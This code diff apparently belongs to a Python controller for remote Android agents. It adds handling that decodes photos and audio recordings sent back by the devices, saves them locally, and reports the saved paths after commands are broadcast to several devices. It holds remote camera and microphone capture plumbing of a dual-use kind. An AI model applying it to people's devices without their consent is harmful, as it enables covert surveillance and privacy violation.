@@ -115,6 +115,65 @@ def _unb64(text):
     except Exception:
         return ""
 
+def _save_media_result(device_id, payload):
+    """
+    Decode media returned by the Android agent and save it on the Controller PC.
+    Returns the saved absolute path, or None if payload is not media.
+    """
+    safe_device = "".join(
+        c if c.isalnum() or c in ("-", "_") else "_"
+        for c in device_id
+    )
+
+    if payload.startswith("PHOTO_OK:"):
+        b64 = payload[len("PHOTO_OK:"):].strip()
+
+        try:
+            data = base64.b64decode(b64, validate=True)
+        except Exception:
+            return None
+
+        directory = os.path.join(BASE_DIR, "captures")
+        os.makedirs(directory, exist_ok=True)
+
+        filename = (
+            f"photo_{safe_device}_"
+            f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+        )
+        path = os.path.abspath(os.path.join(directory, filename))
+
+        with open(path, "wb") as f:
+            f.write(data)
+
+        return path
+
+    if payload.startswith("record_audio_data:"):
+        parts = payload.split(":", 2)
+        if len(parts) != 3:
+            return None
+
+        b64 = parts[2].strip()
+
+        try:
+            data = base64.b64decode(b64, validate=True)
+        except Exception:
+            return None
+
+        directory = os.path.join(BASE_DIR, "recordings")
+        os.makedirs(directory, exist_ok=True)
+
+        filename = (
+            f"audio_{safe_device}_"
+            f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.3gp"
+        )
+        path = os.path.abspath(os.path.join(directory, filename))
+
+        with open(path, "wb") as f:
+            f.write(data)
+
+        return path
+
+    return None
 
 def _hmac_hex(secret_bytes, data):
     return _hmac.new(secret_bytes, data.encode("utf-8"), hashlib.sha256).hexdigest()
@@ -694,29 +753,50 @@ class MainController:
         if not target_ids:
             print("Result: no target devices available.")
             return {}
+
         sent = []
+
         with self.sessions_lock:
             sessions = {did: self.sessions.get(did) for did in target_ids}
+
         for did in target_ids:
             s = sessions.get(did)
+
             if s is None or s.closed:
                 print(f"{did:<24} SKIPPED (not connected)")
                 continue
+
             cid = s.new_command()
             s._events.setdefault(cid, _CmdTicket())
+
             try:
                 s.send(f"cmd|{cid}|{_b64(command_text)}")
                 sent.append((did, cid))
             except OSError as e:
                 print(f"{did:<24} SEND FAILED: {e}")
+
         outcomes = {}
+
         for did, cid in sent:
             status, payload = sessions[did].wait_result(cid, timeout)
-            outcomes[did] = (status, payload)
-            if show:
-                print(f"{did:<24} [{status}] {payload[:500]}")
-        return outcomes
 
+            saved_path = None
+
+            if status == "OK":
+                saved_path = _save_media_result(did, payload)
+
+            if saved_path:
+                display_payload = f"Saved: {saved_path}"
+            else:
+                display_payload = payload[:500]
+
+            outcomes[did] = (status, display_payload)
+
+            if show:
+                print(f"{did:<24} [{status}] {display_payload}")
+
+        return outcomes
+        
     def request_state(self, device_id, timeout=15):
         s = self.sessions.get(device_id)
         if s is None or s.closed:
